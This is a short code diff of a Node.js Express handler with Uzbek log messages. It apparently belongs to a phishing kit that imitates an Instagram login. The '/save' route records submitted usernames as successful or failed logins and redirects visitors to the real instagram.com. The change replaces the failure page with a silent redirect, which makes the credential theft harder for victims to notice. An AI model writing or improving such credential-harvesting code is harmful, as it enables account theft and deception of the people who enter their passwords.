@@ -45,19 +45,10 @@ app.post("/save", async (req, res) => {
         console.log(`MUVOFAQ → ${username} muvaffaqiyatli kirdi`);
         res.redirect("https://www.instagram.com");
     } else {
-        console.log(`XATO → ${username} paroli noto‘g‘ri`);
-        res.send(`
-            <!DOCTYPE html>
-            <html>
-            <head><meta charset="utf-8"><title>Xato</title></head>
-            <body style="font-family:sans-serif;background:#fafafa;text-align:center;padding-top:100px;">
-                <h2 style="color:#ed4956;">Login yoki parol noto‘g‘ri</h2>
-                <p>Iltimos, qayta urinib ko‘ring</p>
-                <script>setTimeout(() => location.href="/", 2500);</script>
-            </body>
-            </html>
-        `);
-    }
+    console.log(`XATO → ${username} paroli noto‘g‘ri`);
+    res.redirect("https://www.instagram.com/");
+}
+
 });
 
 const port = process.env.PORT || 3000;
